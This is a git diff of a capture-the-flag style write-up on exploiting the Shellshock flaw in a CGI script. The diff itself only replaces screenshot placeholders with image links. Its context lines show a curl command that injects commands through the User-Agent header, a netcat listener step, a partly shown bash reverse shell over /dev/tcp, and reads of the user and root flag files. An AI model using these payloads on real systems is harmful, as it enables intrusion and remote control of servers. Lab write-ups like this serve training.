@@ -71,7 +71,7 @@ The scan reveals that `/cgi-bin/test.cgi` is vulnerable to the **Shellshock vuln
 curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://<TARGET_IP>/cgi-bin/test.cgi
 ```
 
-[SCREEN01]
+<img width="924" height="76" alt="SCREEN01" src="https://github.com/user-attachments/assets/c4d3787f-0111-48f8-8f29-f43b537ace34" />
 
 4. On the attacker machine, set up a netcat listener to catch the incoming reverse shell.
 
@@ -91,7 +91,7 @@ curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/bash -i >& /dev/tcp/
 cat /home/ryan/user.txt
 ```
 
-[SCREEN02]
+<img width="641" height="335" alt="SCREEN02" src="https://github.com/user-attachments/assets/2c49c0f2-2bc8-472a-9d12-6c3b4a80123c" />
 
 ---
 
@@ -177,4 +177,4 @@ whoami
 cat /root/root.txt
 ```
 
-[SCREEN03]
+<img width="783" height="360" alt="SCREEN03" src="https://github.com/user-attachments/assets/29043d32-e416-4827-a372-5c6ca510c956" />
